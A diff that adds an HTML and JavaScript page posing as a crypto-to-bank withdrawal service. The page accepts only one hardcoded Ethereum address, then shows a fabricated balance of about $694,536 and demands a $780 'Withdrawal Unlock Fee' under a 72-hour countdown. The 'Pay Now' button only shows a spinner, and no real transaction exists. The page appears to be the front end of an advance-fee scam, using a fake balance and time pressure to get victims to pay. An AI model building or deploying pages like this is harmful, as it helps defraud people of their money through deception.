@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto to Bank Transfer - Proceed</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: #1e293b;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            position: relative; 
+            overflow: hidden;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #38bdf8;
+        }
+
+        p {
+            color: #94a3b8;
+            margin-bottom: 25px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .btn:hover {
+            background-color: #1d4ed8;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 14px;
+            background-color: #0f172a;
+            border: 2px solid #334155;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        select:focus, input:focus {
+            border-color: #38bdf8;
+        }
+
+        label {
+            display: block;
+            text-align: left;
+            margin-bottom: 8px;
+            color: #94a3b8;
+            font-size: 14px;
+        }
+
+        .error-message {
+            display: none;
+            background-color: rgba(239, 68, 68, 0.1);
+            border: 1px solid #ef4444;
+            color: #fca5a5;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 1.4;
+        }
+
+        .summary-box {
+            background-color: #0f172a;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: left;
+            margin-bottom: 20px;
+            border: 1px solid #334155;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 15px;
+        }
+
+        .summary-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .highlight {
+            color: #34d399;
+            font-weight: 600;
+        }
+
+        .timer {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ef4444;
+            margin: 20px 0;
+            letter-spacing: 1px;
+        }
+
+        .spinner-overlay {
+            visibility: hidden;        
+            opacity: 0;
+            pointer-events: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(30, 41, 59, 0.95);
+            display: flex;             
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+            transition: opacity 0.2s;
+        }
+
+        .spinner-overlay.active {
+            visibility: visible;
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #334155;
+            border-top: 5px solid #38bdf8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        .spinner-text {
+            color: #94a3b8;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="spinner-overlay" id="loading-spinner">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinner-message">Processing...</div>
+    </div>
+
+    <div class="step active" id="step2">
+        <h2>Select Asset</h2>
+        <p>Choose the cryptocurrency you want to withdraw and provide your wallet address.</p>
+        
+        <div class="error-message" id="error-box"></div>
+
+        <label for="crypto-select">Choose Crypto</label>
+        <select id="crypto-select" onchange="clearError()">
+            <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+            <option value="Ethereum (ETH)">Ethereum (ETH)</option>
+            <option value="USDT (TRC20)">USDT (TRC20)</option>
+            <option value="BNB">BNB (BSC)</option>
+        </select>
+
+        <label for="wallet-address">Your Crypto Wallet Address</label>
+        <input type="text" id="wallet-address" placeholder="Enter or paste address here..." autocomplete="off" oninput="clearError()">
+
+        <button class="btn" onclick="processStep2()">Next</button>
+    </div>
+
+    <div class="step" id="step3">
+        <h2>Payment Details</h2>
+        <p>Review the transaction details and complete the required network fee payment before the timer expires.</p>
+        
+        <div class="summary-box">
+            <div class="summary-item">
+                <span>Selected Crypto:</span>
+                <span id="display-crypto" class="highlight">-</span>
+            </div>
+            <div class="summary-item">
+                <span>Crypto Value:</span>
+                <span class="highlight">$694,536.50 (202.48 ETH)</span>
+            </div>
+            <div class="summary-item">
+                <span>Withdrawal Unlock Fee:</span>
+                <span style="color: #ef4444; font-weight: 600;">$780.00</span>
+            </div>
+        </div>
+
+        <p style="margin-bottom: 5px;">Time remaining to complete payment:</p>
+        <div class="timer" id="countdown">72:00:00</div>
+
+        <button class="btn" style="background-color: #10b981;" onclick="triggerPaymentProcessing()">Pay Now</button>
+    </div>
+
+</div>
+
+<script>
+    const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
+
+    function showSpinner(text, duration, callback) {
+        const spinner = document.getElementById('loading-spinner');
+        const spinnerText = document.getElementById('spinner-message');
+        
+        spinnerText.innerText = text;
+        spinner.classList.add('active');      
+
+        setTimeout(() => {
+            spinner.classList.remove('active');  
+            if (callback) callback();
+        }, duration);
+    }
+
+    function showError(message) {
+        const errorBox = document.getElementById('error-box');
+        errorBox.innerText = message;
+        errorBox.style.display = 'block';
+    }
+
+    function clearError() {
+        const errorBox = document.getElementById('error-box');
+        errorBox.style.display = 'none';
+        errorBox.innerText = '';
+    }
+
+    function toggleInternalStep(stepNumber) {
+        document.querySelectorAll('.step').forEach(step => {
+            step.classList.remove('active');
+        });
+        document.getElementById('step' + stepNumber).classList.add('active');
+    }
+
+    function processStep2() {
+        const address = document.getElementById('wallet-address').value.trim();
+        const selectedCrypto = document.getElementById('crypto-select').value;
+
+        if (address === "") {
+            showError("Please enter your crypto address to proceed.");
+            return;
+        }
+
+        if (selectedCrypto !== "Ethereum (ETH)") {
+            showError("Error: Only Ethereum (ETH) transactions are supported at this time.");
+            return;
+        }
+
+        if (address !== REQUIRED_ADDRESS) {
+            showError("Error: Invalid or unauthorized wallet address for this transaction.");
+            return;
+        }
+
+        document.getElementById('display-crypto').innerText = selectedCrypto;
+
+        showSpinner("Verifying network configurations...", 1800, () => {
+            toggleInternalStep(3);
+            startTimer(259200); // 72 Hours running natively inside page 2
+        });
+    }
+
+    function triggerPaymentProcessing() {
+        showSpinner("Initiating secure payment protocol...", 2000, () => {
+            console.log('Payment processing initiated!');
+        });
+    }
+
+    function startTimer(duration) {
+        let timer = duration, hours, minutes, seconds;
+        const display = document.getElementById('countdown');
+        
+        if(window.timerInterval) clearInterval(window.timerInterval);
+
+        window.timerInterval = setInterval(function () {
+            hours = parseInt(timer / 3600, 10);
+            minutes = parseInt((timer % 3600) / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            hours = hours < 10 ? "0" + hours : hours;
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.textContent = hours + ":" + minutes + ":" + seconds;
+
+            if (--timer < 0) {
+                clearInterval(window.timerInterval);
+                display.textContent = "EXPIRED";
+                showError("Time has expired! Please restart the transaction.");
+            }
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
